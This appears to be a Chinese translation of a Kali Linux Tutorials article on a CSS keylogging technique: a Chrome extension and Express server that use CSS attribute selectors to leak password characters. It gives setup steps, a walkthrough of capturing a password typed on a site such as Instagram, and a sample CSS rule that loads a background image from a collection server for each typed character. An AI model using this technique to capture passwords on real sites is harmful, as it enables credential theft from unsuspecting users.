# CSS 键盘记录器–Chrome 扩展和 Express 服务器，利用 CSS 的键盘记录功能

> 原文：<https://kalilinuxtutorials.com/css-keylogger-chrome-exploits-keylogging/>

CSS 键盘记录器是一个 Chrome 扩展和 Express 服务器，利用 CSS 的键盘记录功能。使用一个简单的脚本就可以创建一个 css 文件，为每个 ASCII 字符发送一个定制请求。

## **设置 Chrome 扩展**

1.  下载存储库`git clone https://github.com/maxchehab/CSS-Keylogging`
2.  在你的浏览器中访问`chrome://extensions`(或者点击 Omnibox 最右边的图标打开 Chrome 菜单:菜单的图标是三个水平条。并选择“更多工具”菜单下的“扩展”来找到相同的位置)。
3.  确保右上角的“开发人员模式”复选框已选中。
4.  点击`Load unpacked extension…`弹出文件选择对话框。
5.  在您下载该库的目录中选择`css-keylogger-extension`。

**也可解读为 [挥发性框架——挥发性内存提取实用框架](https://kalilinuxtutorials.com/volatility-framework-volatile-memory/)**

### **设置快递服务器**

1.  `yarn`
2.  `yarn start`

## **哈克斯金 l33t 通行证**

1.  打开一个使用受控组件框架(如 React)的网站。[https://instagram.com](https://www.instagram.com/)。
2.  按下任何网页右上角的扩展名`C`。
3.  键入您的密码。
4.  您的密码应该被 express 服务器捕获。

## **CSS 键盘记录器如何工作**

这个攻击真的很简单。利用 CSS 属性选择器，可以在加载一个`background-image`的前提下从外部服务器请求资源。

例如，下面的 css 将选择所有输入的`type`等于`password`并且`value`以`a`结束。然后它会尝试从[这里](http://localhost:3000/a)加载一个图像。

```
input[type="password"][value$="a"] {
  background-image: url("http://localhost:3000/a");
}
```

[![](img/d861a9096555aeb1980fc054015933d7.png)](https://github.com/maxchehab/CSS-Keylogging)